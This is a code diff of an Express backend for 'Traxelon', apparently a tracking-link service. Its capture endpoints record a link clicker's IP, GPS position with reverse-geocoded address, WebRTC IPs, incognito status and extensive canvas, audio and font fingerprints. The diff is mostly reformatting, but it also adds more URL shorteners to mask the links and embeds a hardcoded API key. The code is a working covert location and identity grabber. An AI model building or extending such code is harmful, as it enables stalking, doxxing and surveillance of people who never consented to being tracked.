@@ -37,14 +37,13 @@ function parseDevice(ua = "") {
 function getClientIP(req) {
     const forwarded = req.headers["x-forwarded-for"];
     if (forwarded) return forwarded.split(",")[0].trim();
-    return req.socket?.remoteAddress || req.ip || "Unknown";
+    return req.socket ?.remoteAddress || req.ip || "Unknown";
 }
 
 async function reverseGeocode(lat, lon) {
     try {
         const res = await axios.get(
-            `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`,
-            { headers: { "User-Agent": "Traxelon/1.0", Accept: "application/json" }, timeout: 6000 }
+            `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`, { headers: { "User-Agent": "Traxelon/1.0", Accept: "application/json" }, timeout: 6000 }
         );
         const data = res.data;
         const addr = data.address || {};
@@ -64,15 +63,22 @@ async function enrichIP(ip) {
             return { note: "Local IP" };
         }
         const res = await axios.get(
-            `http://ip-api.com/json/${ip}?fields=status,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,reverse,query,proxy,hosting,mobile`,
-            { timeout: 5000 }
+            `http://ip-api.com/json/${ip}?fields=status,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,reverse,query,proxy,hosting,mobile`, { timeout: 5000 }
         );
         const d = res.data;
         if (d.status !== "success") return {};
         return {
-            country: d.country, countryCode: d.countryCode, region: d.regionName,
-            city: d.city, zip: d.zip, lat: d.lat, lon: d.lon,
-            timezone: d.timezone, isp: d.isp, org: d.org, asn: d.as,
+            country: d.country,
+            countryCode: d.countryCode,
+            region: d.regionName,
+            city: d.city,
+            zip: d.zip,
+            lat: d.lat,
+            lon: d.lon,
+            timezone: d.timezone,
+            isp: d.isp,
+            org: d.org,
+            asn: d.as,
             hostname: d.reverse || null,
             isProxy: d.proxy || false,
             isHosting: d.hosting || false,
@@ -83,7 +89,7 @@ async function enrichIP(ip) {
 
 router.get("/health", (_req, res) => res.status(200).json({ ok: true }));
 
-router.post("/shorten", async (req, res) => {
+router.post("/shorten", async(req, res) => {
     try {
         const { uid, label, destinationUrl } = req.body;
         if (!uid) return res.status(400).json({ error: "uid is required" });
@@ -96,7 +102,7 @@ router.post("/shorten", async (req, res) => {
     }
 });
 
-router.post("/capture", async (req, res) => {
+router.post("/capture", async(req, res) => {
     try {
         const body = req.body;
         const { token } = body;
@@ -111,84 +117,142 @@ router.post("/capture", async (req, res) => {
         if (body.gpsLat && body.gpsLon) geoData = await reverseGeocode(body.gpsLat, body.gpsLon);
         const deviceData = {
             ip,
-            country: ipData.country || null, countryCode: ipData.countryCode || null,
-            region: ipData.region || null, city: ipData.city || null,
-            zip: ipData.zip || null, lat: ipData.lat || null, lon: ipData.lon || null,
-            timezone: ipData.timezone || null, isp: ipData.isp || null,
-            org: ipData.org || null, asn: ipData.asn || null,
-            hostname: ipData.hostname || null, isProxy: ipData.isProxy || null,
-            isHosting: ipData.isHosting || null, isMobileNetwork: ipData.isMobileNetwork || null,
-            gpsLat: body.gpsLat || null, gpsLon: body.gpsLon || null,
-            gpsAccuracy: body.gpsAccuracy || null, gpsAltitude: body.gpsAltitude || null,
-            gpsSpeed: body.gpsSpeed || null, gpsHeading: body.gpsHeading || null,
-            gpsAddress: geoData.gpsAddress || null, gpsCity: geoData.gpsCity || null,
-            gpsState: geoData.gpsState || null, gpsPincode: geoData.gpsPincode || null,
+            country: ipData.country || null,
+            countryCode: ipData.countryCode || null,
+            region: ipData.region || null,
+            city: ipData.city || null,
+            zip: ipData.zip || null,
+            lat: ipData.lat || null,
+            lon: ipData.lon || null,
+            timezone: ipData.timezone || null,
+            isp: ipData.isp || null,
+            org: ipData.org || null,
+            asn: ipData.asn || null,
+            hostname: ipData.hostname || null,
+            isProxy: ipData.isProxy || null,
+            isHosting: ipData.isHosting || null,
+            isMobileNetwork: ipData.isMobileNetwork || null,
+            gpsLat: body.gpsLat || null,
+            gpsLon: body.gpsLon || null,
+            gpsAccuracy: body.gpsAccuracy || null,
+            gpsAltitude: body.gpsAltitude || null,
+            gpsSpeed: body.gpsSpeed || null,
+            gpsHeading: body.gpsHeading || null,
+            gpsAddress: geoData.gpsAddress || null,
+            gpsCity: geoData.gpsCity || null,
+            gpsState: geoData.gpsState || null,
+            gpsPincode: geoData.gpsPincode || null,
             gpsCountry: geoData.gpsCountry || null,
-            browser: parseBrowser(ua), os: parseOS(ua), device: parseDevice(ua),
-            userAgent: ua, browserVersion: body.browserVersion || null,
-            appName: body.appName || null, appVersion: body.appVersion || null,
-            product: body.product || null, buildID: body.buildID || null,
-            vendor: body.vendor || null, platform: body.platform || null,
+            browser: parseBrowser(ua),
+            os: parseOS(ua),
+            device: parseDevice(ua),
+            userAgent: ua,
+            browserVersion: body.browserVersion || null,
+            appName: body.appName || null,
+            appVersion: body.appVersion || null,
+            product: body.product || null,
+            buildID: body.buildID || null,
+            vendor: body.vendor || null,
+            platform: body.platform || null,
             architecture: body.architecture || null,
-            cpuCores: body.cpuCores || null, ram: body.ram || null,
+            cpuCores: body.cpuCores || null,
+            ram: body.ram || null,
             maxTouchPoints: body.maxTouchPoints || null,
-            touchSupport: body.touchSupport ?? null, pointerType: body.pointerType || null,
-            javaEnabled: body.javaEnabled ?? null, pdfViewerEnabled: body.pdfViewerEnabled ?? null,
-            gpu: body.gpu || null, gpuVendor: body.gpuVendor || null,
-            webglVersion: body.webglVersion || null, webglRenderer: body.webglRenderer || null,
-            webglVendor: body.webglVendor || null, webglShadingLanguage: body.webglShadingLanguage || null,
-            maxTextureSize: body.maxTextureSize || null, maxViewportDims: body.maxViewportDims || null,
-            maxAnisotropy: body.maxAnisotropy || null, maxVertexAttribs: body.maxVertexAttribs || null,
+            touchSupport: body.touchSupport ?? null,
+            pointerType: body.pointerType || null,
+            javaEnabled: body.javaEnabled ?? null,
+            pdfViewerEnabled: body.pdfViewerEnabled ?? null,
+            gpu: body.gpu || null,
+            gpuVendor: body.gpuVendor || null,
+            webglVersion: body.webglVersion || null,
+            webglRenderer: body.webglRenderer || null,
+            webglVendor: body.webglVendor || null,
+            webglShadingLanguage: body.webglShadingLanguage || null,
+            maxTextureSize: body.maxTextureSize || null,
+            maxViewportDims: body.maxViewportDims || null,
+            maxAnisotropy: body.maxAnisotropy || null,
+            maxVertexAttribs: body.maxVertexAttribs || null,
             maxVertexUniformVectors: body.maxVertexUniformVectors || null,
             maxFragmentUniformVectors: body.maxFragmentUniformVectors || null,
             aliasedPointSizeRange: body.aliasedPointSizeRange || null,
             aliasedLineWidthRange: body.aliasedLineWidthRange || null,
             webglExtensionsCount: body.webglExtensionsCount || null,
-            webgl2Support: body.webgl2Support ?? null, webglHash: body.webglHash || null,
+            webgl2Support: body.webgl2Support ?? null,
+            webglHash: body.webglHash || null,
             shaderPrecision: body.shaderPrecision || null,
-            screenWidth: body.screenWidth || null, screenHeight: body.screenHeight || null,
-            screenAvailWidth: body.screenAvailWidth || null, screenAvailHeight: body.screenAvailHeight || null,
-            colorDepth: body.colorDepth || null, pixelDepth: body.pixelDepth || null,
-            pixelRatio: body.pixelRatio || null, windowWidth: body.windowWidth || null,
-            windowHeight: body.windowHeight || null, orientation: body.orientation || null,
-            orientationAngle: body.orientationAngle ?? null, outerWidth: body.outerWidth || null,
-            outerHeight: body.outerHeight || null, hdrSupport: body.hdrSupport || null,
-            colorGamut: body.colorGamut || null, forcedColors: body.forcedColors || null,
+            screenWidth: body.screenWidth || null,
+            screenHeight: body.screenHeight || null,
+            screenAvailWidth: body.screenAvailWidth || null,
+            screenAvailHeight: body.screenAvailHeight || null,
+            colorDepth: body.colorDepth || null,
+            pixelDepth: body.pixelDepth || null,
+            pixelRatio: body.pixelRatio || null,
+            windowWidth: body.windowWidth || null,
+            windowHeight: body.windowHeight || null,
+            orientation: body.orientation || null,
+            orientationAngle: body.orientationAngle ?? null,
+            outerWidth: body.outerWidth || null,
+            outerHeight: body.outerHeight || null,
+            hdrSupport: body.hdrSupport || null,
+            colorGamut: body.colorGamut || null,
+            forcedColors: body.forcedColors || null,
             invertedColors: body.invertedColors || null,
             prefersColorScheme: body.prefersColorScheme || null,
             prefersReducedMotion: body.prefersReducedMotion || null,
             cssPxDensity: body.cssPxDensity || null,
-            batteryLevel: body.batteryLevel ?? null, batteryCharging: body.batteryCharging ?? null,
+            batteryLevel: body.batteryLevel ?? null,
+            batteryCharging: body.batteryCharging ?? null,
             batteryChargingTime: body.batteryChargingTime ?? null,
             batteryDischargingTime: body.batteryDischargingTime ?? null,
-            connectionType: body.connectionType || null, connectionDownlink: body.connectionDownlink || null,
-            connectionRtt: body.connectionRtt || null, connectionSaveData: body.connectionSaveData ?? null,
+            connectionType: body.connectionType || null,
+            connectionDownlink: body.connectionDownlink || null,
+            connectionRtt: body.connectionRtt || null,
+            connectionSaveData: body.connectionSaveData ?? null,
             connectionDownlinkMax: body.connectionDownlinkMax || null,
-            localTime: body.localTime || null, clientTimezone: body.clientTimezone || null,
-            timezoneOffset: body.timezoneOffset ?? null, dstActive: body.dstActive || null,
-            incognito: body.incognito ?? null, adBlockDetected: body.adBlockDetected ?? null,
-            cookiesEnabled: body.cookiesEnabled ?? null, doNotTrack: body.doNotTrack || null,
-            historyLength: body.historyLength || null, referrer: body.referrer || null,
-            language: body.language || null, languages: body.languages || null,
-            canvasHash: body.canvasHash || null, canvasGeometryHash: body.canvasGeometryHash || null,
-            audioFingerprint: body.audioFingerprint || null, cssHash: body.cssHash || null,
+            localTime: body.localTime || null,
+            clientTimezone: body.clientTimezone || null,
+            timezoneOffset: body.timezoneOffset ?? null,
+            dstActive: body.dstActive || null,
+            incognito: body.incognito ?? null,
+            adBlockDetected: body.adBlockDetected ?? null,
+            cookiesEnabled: body.cookiesEnabled ?? null,
+            doNotTrack: body.doNotTrack || null,
+            historyLength: body.historyLength || null,
+            referrer: body.referrer || null,
+            language: body.language || null,
+            languages: body.languages || null,
+            canvasHash: body.canvasHash || null,
+            canvasGeometryHash: body.canvasGeometryHash || null,
+            audioFingerprint: body.audioFingerprint || null,
+            cssHash: body.cssHash || null,
             fontFingerprint: body.fontFingerprint || null,
-            cameras: body.cameras ?? null, microphones: body.microphones ?? null,
-            speakers: body.speakers ?? null, speechVoicesCount: body.speechVoicesCount ?? null,
+            cameras: body.cameras ?? null,
+            microphones: body.microphones ?? null,
+            speakers: body.speakers ?? null,
+            speechVoicesCount: body.speechVoicesCount ?? null,
             speechVoices: body.speechVoices || null,
-            storageQuota: body.storageQuota || null, storageUsage: body.storageUsage || null,
+            storageQuota: body.storageQuota || null,
+            storageUsage: body.storageUsage || null,
             localStorageEnabled: body.localStorageEnabled ?? null,
             sessionStorageEnabled: body.sessionStorageEnabled ?? null,
             indexedDBEnabled: body.indexedDBEnabled ?? null,
-            cacheAPIEnabled: body.cacheAPIEnabled || null, cookiesCount: body.cookiesCount ?? null,
-            fontsDetected: body.fontsDetected ?? null, fontsList: body.fontsList || null,
-            pluginsCount: body.pluginsCount ?? null, plugins: body.plugins || null,
+            cacheAPIEnabled: body.cacheAPIEnabled || null,
+            cookiesCount: body.cookiesCount ?? null,
+            fontsDetected: body.fontsDetected ?? null,
+            fontsList: body.fontsList || null,
+            pluginsCount: body.pluginsCount ?? null,
+            plugins: body.plugins || null,
             mimeTypes: body.mimeTypes || null,
-            pageLoadTime: body.pageLoadTime || null, domContentLoaded: body.domContentLoaded || null,
-            dnsLookupTime: body.dnsLookupTime || null, tcpConnectTime: body.tcpConnectTime || null,
-            ttfb: body.ttfb || null, memoryUsed: body.memoryUsed || null,
-            memoryTotal: body.memoryTotal || null, memoryLimit: body.memoryLimit || null,
-            webrtcLocalIP: body.webrtcLocalIP || null, webrtcPublicIP: body.webrtcPublicIP || null,
+            pageLoadTime: body.pageLoadTime || null,
+            domContentLoaded: body.domContentLoaded || null,
+            dnsLookupTime: body.dnsLookupTime || null,
+            tcpConnectTime: body.tcpConnectTime || null,
+            ttfb: body.ttfb || null,
+            memoryUsed: body.memoryUsed || null,
+            memoryTotal: body.memoryTotal || null,
+            memoryLimit: body.memoryLimit || null,
+            webrtcLocalIP: body.webrtcLocalIP || null,
+            webrtcPublicIP: body.webrtcPublicIP || null,
             webrtcSupport: body.webrtcSupport || null,
             geolocationPermission: body.geolocationPermission || null,
             notificationsPermission: body.notificationsPermission || null,
@@ -204,8 +268,10 @@ router.post("/capture", async (req, res) => {
             serviceWorkerSupport: body.serviceWorkerSupport ?? null,
             webAssemblySupport: body.webAssemblySupport ?? null,
             bluetoothSupport: body.bluetoothSupport ?? null,
-            usbSupport: body.usbSupport ?? null, gamepadSupport: body.gamepadSupport || null,
-            xrSupport: body.xrSupport || null, offscreenCanvasSupport: body.offscreenCanvasSupport || null,
+            usbSupport: body.usbSupport ?? null,
+            gamepadSupport: body.gamepadSupport || null,
+            xrSupport: body.xrSupport || null,
+            offscreenCanvasSupport: body.offscreenCanvasSupport || null,
             sharedArrayBufferSupport: body.sharedArrayBufferSupport || null,
             broadcastChannelSupport: body.broadcastChannelSupport || null,
             paymentRequestSupport: body.paymentRequestSupport || null,
@@ -220,7 +286,7 @@ router.post("/capture", async (req, res) => {
     }
 });
 
-router.post("/capture-gps", async (req, res) => {
+router.post("/capture-gps", async(req, res) => {
     try {
         const { token, gpsLat, gpsLon, gpsAccuracy, gpsAltitude, gpsSpeed, gpsHeading } = req.body;
         if (!token || !gpsLat || !gpsLon) return res.status(400).json({ error: "missing data" });
@@ -231,12 +297,17 @@ router.post("/capture-gps", async (req, res) => {
         const linkDoc = snap.docs[0];
         const captures = [...(linkDoc.data().captures || [])];
         if (captures.length > 0) {
-            const last = { ...captures[captures.length - 1] };
-            last.gpsLat = gpsLat; last.gpsLon = gpsLon;
-            last.gpsAccuracy = gpsAccuracy || null; last.gpsAltitude = gpsAltitude || null;
-            last.gpsSpeed = gpsSpeed || null; last.gpsHeading = gpsHeading || null;
-            last.gpsAddress = geoData.gpsAddress || null; last.gpsCity = geoData.gpsCity || null;
-            last.gpsState = geoData.gpsState || null; last.gpsPincode = geoData.gpsPincode || null;
+            const last = {...captures[captures.length - 1] };
+            last.gpsLat = gpsLat;
+            last.gpsLon = gpsLon;
+            last.gpsAccuracy = gpsAccuracy || null;
+            last.gpsAltitude = gpsAltitude || null;
+            last.gpsSpeed = gpsSpeed || null;
+            last.gpsHeading = gpsHeading || null;
+            last.gpsAddress = geoData.gpsAddress || null;
+            last.gpsCity = geoData.gpsCity || null;
+            last.gpsState = geoData.gpsState || null;
+            last.gpsPincode = geoData.gpsPincode || null;
             last.gpsCountry = geoData.gpsCountry || null;
             captures[captures.length - 1] = last;
             await linksRef.doc(linkDoc.id).update({ captures });
@@ -248,52 +319,115 @@ router.post("/capture-gps", async (req, res) => {
     }
 });
 
-router.post("/shorten-url", async (req, res) => {
+// router.post("/shorten-url", async (req, res) => {
+//     try {
+//         const { url, provider } = req.body;
+//         if (!url) return res.status(400).json({ error: "url required" });
+//         console.log(`[shorten-url] provider=${provider}`);
+//         let shortUrl = null;
+//         if (provider === "isgd") {
+//             const r = await axios.get(
+//                 "https://is.gd/create.php?format=simple&url=" + encodeURIComponent(url),
+//                 { timeout: 10000, headers: { "User-Agent": "Mozilla/5.0" } }
+//             );
+//             const result = String(r.data || "").trim();
+//             console.log("[shorten-url] is.gd:", result);
+//             if (result.startsWith("https://is.gd/") || result.startsWith("http://is.gd/")) shortUrl = result;
+//         } else if (provider === "vgd") {
+//             const r = await axios.get(
+//                 "https://v.gd/create.php?format=simple&url=" + encodeURIComponent(url),
+//                 { timeout: 10000, headers: { "User-Agent": "Mozilla/5.0" } }
+//             );
+//             const result = String(r.data || "").trim();
+//             console.log("[shorten-url] v.gd:", result);
+//             if (result.startsWith("https://v.gd/") || result.startsWith("http://v.gd/")) shortUrl = result;
+//         } else if (provider === "tinyurl") {
+//             const r = await axios.get(
+//                 "https://tinyurl.com/api-create.php?url=" + encodeURIComponent(url),
+//                 { timeout: 10000 }
+//             );
+//             const result = String(r.data || "").trim();
+//             console.log("[shorten-url] tinyurl:", result);
+//             if (result.startsWith("https://tinyurl.com/") || result.startsWith("http://tinyurl.com/")) shortUrl = result;
+//         }
+//         console.log(`[shorten-url] final=${shortUrl}`);
+//         return res.status(200).json({ shortUrl });
+//     } catch (err) {
+//         console.error("[shorten-url] ERROR:", err.message);
+//         return res.status(200).json({ shortUrl: null, error: err.message });
+//     }
+// });
+
+
+router.post("/shorten-url", async(req, res) => {
     try {
         const { url, provider } = req.body;
         if (!url) return res.status(400).json({ error: "url required" });
         console.log(`[shorten-url] provider=${provider}`);
         let shortUrl = null;
-        if (provider === "isgd") {
+
+        if (provider === "tinyurl") {
             const r = await axios.get(
-                "https://is.gd/create.php?format=simple&url=" + encodeURIComponent(url),
-                { timeout: 10000, headers: { "User-Agent": "Mozilla/5.0" } }
+                "https://tinyurl.com/api-create.php?url=" + encodeURIComponent(url), { timeout: 10000 }
             );
             const result = String(r.data || "").trim();
-            console.log("[shorten-url] is.gd:", result);
-            if (result.startsWith("https://is.gd/") || result.startsWith("http://is.gd/")) shortUrl = result;
+            if (result.startsWith("https://tinyurl.com/") || result.startsWith("http://tinyurl.com/")) {
+                shortUrl = result;
+            }
+
+        } else if (provider === "isgd") {
+            const r = await axios.get(
+                "https://is.gd/create.php?format=simple&url=" + encodeURIComponent(url), { timeout: 10000, headers: { "User-Agent": "Mozilla/5.0" } }
+            );
+            const result = String(r.data || "").trim();
+            if (result.startsWith("https://is.gd/") || result.startsWith("http://is.gd/")) {
+                shortUrl = result;
+            }
+
         } else if (provider === "vgd") {
             const r = await axios.get(
-                "https://v.gd/create.php?format=simple&url=" + encodeURIComponent(url),
-                { timeout: 10000, headers: { "User-Agent": "Mozilla/5.0" } }
+                "https://v.gd/create.php?format=simple&url=" + encodeURIComponent(url), { timeout: 10000, headers: { "User-Agent": "Mozilla/5.0" } }
             );
             const result = String(r.data || "").trim();
-            console.log("[shorten-url] v.gd:", result);
-            if (result.startsWith("https://v.gd/") || result.startsWith("http://v.gd/")) shortUrl = result;
-        } else if (provider === "tinyurl") {
+            if (result.startsWith("https://v.gd/") || result.startsWith("http://v.gd/")) {
+                shortUrl = result;
+            }
+
+        } else if (provider === "dagd") {
             const r = await axios.get(
-                "https://tinyurl.com/api-create.php?url=" + encodeURIComponent(url),
-                { timeout: 10000 }
+                "https://da.gd/shorten?url=" + encodeURIComponent(url), { timeout: 10000, headers: { "User-Agent": "Mozilla/5.0" } }
             );
             const result = String(r.data || "").trim();
-            console.log("[shorten-url] tinyurl:", result);
-            if (result.startsWith("https://tinyurl.com/") || result.startsWith("http://tinyurl.com/")) shortUrl = result;
+            if (result.startsWith("https://da.gd/") || result.startsWith("http://da.gd/")) {
+                shortUrl = result;
+            }
+
+        } else if (provider === "shareaholic") {
+            const r = await axios.get(
+                "https://shareaholic.com/v2/share/shorten_link?apikey=8943b7fd64cd8b1770ff5affa9a9437b&link=" + encodeURIComponent(url), { timeout: 10000, headers: { "User-Agent": "Mozilla/5.0" } }
+            );
+            const data = r.data;
+            if (data ?.data ?.link) {
+                shortUrl = data.data.link;
+            }
         }
+
         console.log(`[shorten-url] final=${shortUrl}`);
         return res.status(200).json({ shortUrl });
+
     } catch (err) {
         console.error("[shorten-url] ERROR:", err.message);
         return res.status(200).json({ shortUrl: null, error: err.message });
     }
 });
 
-router.get("/geo-ip", async (req, res) => {
+router.get("/geo-ip", async(req, res) => {
     const ip = getClientIP(req);
     const data = await enrichIP(ip);
     return res.status(200).json(data);
 });
 
-router.post("/credits", async (req, res) => {
+router.post("/credits", async(req, res) => {
     try {
         const { uid, amount } = req.body;
         if (!uid || !amount) return res.status(400).json({ error: "uid and amount required" });
@@ -305,4 +439,5 @@ router.post("/credits", async (req, res) => {
 });
 
 export default router;
+
 
